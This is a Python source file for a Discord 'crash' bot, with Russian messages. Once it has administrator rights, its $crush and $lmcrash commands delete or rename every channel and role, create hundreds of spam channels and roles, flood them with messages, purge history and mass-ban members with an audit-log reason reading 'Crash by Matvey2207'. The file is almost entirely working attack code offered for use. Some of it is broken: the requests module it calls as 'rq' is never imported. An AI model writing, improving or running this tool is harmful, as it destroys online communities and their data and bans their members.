import discord, asyncio, os, yaml
import time
from discord.ext import commands

bot = commands.Bot('$', help_command=None, intents=discord.Intents.all())

try:
	config = yaml.safe_load(open('config.yml', encoding='utf8'))
	statusType = config['status']['type']
	statusName = config['status']['text']
	token = config['token']
	spamText = config['spam-text']
	spamCount = int(config['spam-count'])
	channelsName = config['channels']['name']
	channelsTopic = config['channels']['topic']
	rolesName = config['roles']['name']
	rolesColor = config['roles']['color']
	rolesResetPermissions = config['roles']['reset-permissions']
	lmPurge = config['channels']['lm-purge']
except:
	print('Ошибка загрузки конфига! Возможно он неполный или повреждён.')
	exit()

async def massBan(guild, limit: int = None):
	members_iter = guild.fetch_members(limit=limit)
	members_list = await members_iter.flatten()
	for member in members_list:
		if member.roles[-1].position >= guild.me.roles[-1].position: # юзер выше нас/на уровне с нами
			continue
		rq.put(f'https://discord.com/api/guilds/{guild.id}/bans/{member.id}', headers={'Authorization': 'Bot ' + token, 'X-Audit-Log-Reason': 'Crash by Matvey2207'}, json={'delete_message_days': 0})
	
@bot.event
async def on_ready():
	print(f'Запущен: {bot.user}')
	await bot.change_presence(activity=discord.Activity(type=getattr(discord.ActivityType, statusType, discord.ActivityType.playing), name=statusName))

@bot.command()
async def crush(ctx):
	if not ctx.guild:
		return
	if not ctx.guild.me.guild_permissions.administrator:
		return await ctx.send('Для выполнения данной команды боту нужно право **`Администратор`**')
	start = time.time()
	async def spam_task(channel):
		me = asyncio.current_task()
		name = me.get_name()
		for _ in range(spamCount):
			try:
				await channel.send(spamText)
			except:
				pass
			else:
				pass #print(f'[{F.BLUE}{name}{cl}] Отправил спам-сообщение')
	async def delc_task(guild):
		me = asyncio.current_task()
		name = me.get_name()
		async def delete(channel):
			try:
				await channel.delete()
			except:
				try:
					await channel.delete()
				except:
					pass
				else:
					pass #print(f'[{F.BLUE}{name}{cl}] Удалил канал {F.RED}{channel.name}{cl}')
			else:
				pass #print(f'[{F.BLUE}{name}{cl}] Удалил канал {F.RED}{channel.name}{cl}')
		await asyncio.gather(*[delete(channel) for channel in guild.channels if (channel.type == discord.ChannelType.text and channel.topic != channelsTopic) or channel.type != discord.ChannelType.text])
	async def delr_task(guild):
		me = asyncio.current_task()
		name = me.get_name()
		async def delete(role):
			try:
				await role.delete()
			except:
				try:
					await role.delete()
				except:
					pass
				else:
					pass #print(f'[{F.BLUE}{name}{cl}] Удалил роль {F.RED}{role.name}{cl}')
			else:
				pass #print(f'[{F.BLUE}{name}{cl}] Удалил роль {F.RED}{role.name}{cl}')
		await asyncio.gather(*[delete(role) for role in guild.roles if role.name != rolesName])
	async def crr_task(guild):
		me = asyncio.current_task()
		nme = me.get_name()
		async def create(name, color):
			try:
				await guild.create_role(name=name, color=color)
			except:
				pass
			else:
				pass #print(f'[{F.BLUE}{nme}{cl}] Создал роль {F.GREEN}{name}{cl}')
		await asyncio.gather(*[create(name=rolesName, color=getattr(discord.Colour, rolesColor, discord.Colour.default)()) for _ in range(498)])
	async def crc_task(guild):
		me = asyncio.current_task()
		nme = me.get_name()
		async def create(name, topic):
			try:
				channel = await guild.create_text_channel(name=name, topic=topic)
				asyncio.create_task(spam_task(channel))
			except Exception as e:
				pass #print(e)
			else:
				pass #print(f'[{F.BLUE}{nme}{cl}] Создал канал {F.GREEN}{name}{cl}')
		await asyncio.gather(*[create(name=channelsName, topic=channelsTopic) for _ in range(498)])
	tasks = [asyncio.create_task(tsk(ctx.guild)) for tsk in [delc_task, delr_task, crr_task, crc_task, massBan]]
	while False in [t.done() for t in tasks]:
		await asyncio.sleep(0.1)
	end = time.time()
	timed = end - start
	pass #print(f'[{F.GREEN}DONE{cl}] Окончен краш сервера "{F.BLUE}{ctx.guild.name}{cl}". Прошло {F.BLUE}{timed} сек.{cl} с начала краша.')
	
	
@bot.command()
async def lmcrash(ctx):
	if not ctx.guild:
		return
	if not ctx.guild.me.guild_permissions.administrator:
		return await ctx.send('Для выполнения данной команды боту нужно право **`Администратор`**')
	start = time.time()
	async def spam_task(channel):
		me = asyncio.current_task()
		name = me.get_name()
		if lmPurge:
			try:
				await channel.purge(limit=100)
			except:
				pass
		for _ in range(spamCount):
			try:
				await channel.send(spamText)
			except:
				pass
			else:
				pass #print(f'[{F.BLUE}{name}{cl}] Отправил спам-сообщение')
	async def delc_task(guild):
		me = asyncio.current_task()
		name = me.get_name()
		async def delete(channel):
			try:
				await channel.edit(name=channelsName, topic=channelsTopic)
			except:
				try:
					await channel.edit(name=channelsName, topic=channelsTopic)
				except:
					pass
				else:
					asyncio.create_task(spam_task(channel))
			else:
				asyncio.create_task(spam_task(channel))
		await asyncio.gather(*[delete(channel) for channel in guild.channels if (channel.type == discord.ChannelType.text and channel.topic != channelsTopic) or channel.type != discord.ChannelType.text])
	async def delr_task(guild):
		me = asyncio.current_task()
		name = me.get_name()
		async def delete(role):
			try:
				await role.edit(name=rolesName, color=getattr(discord.Colour, rolesColor, discord.Colour.default)(), permissions=discord.Permissions(permissions=0) if rolesResetPermissions else role.permissions)
			except:
				try:
					await role.edit(name=rolesName, color=getattr(discord.Colour, rolesColor, discord.Colour.default)(), permissions=discord.Permissions(permissions=0) if rolesResetPermissions else role.permissions)
				except:
					pass
				else:
					pass 
			else:
				pass
		await asyncio.gather(*[delete(role) for role in guild.roles if role.name != rolesName])
	tasks = [asyncio.create_task(tsk(ctx.guild)) for tsk in [delc_task, delr_task, massBan]]
	while False in [t.done() for t in tasks]:
		await asyncio.sleep(0.1)
	end = time.time()
	timed = end - start
	pass #print(f'[{F.GREEN}DONE{cl}] Окончен краш сервера "{F.BLUE}{ctx.guild.name}{cl}". Прошло {F.BLUE}{timed} сек.{cl} с начала краша.')
	

bot.run(token)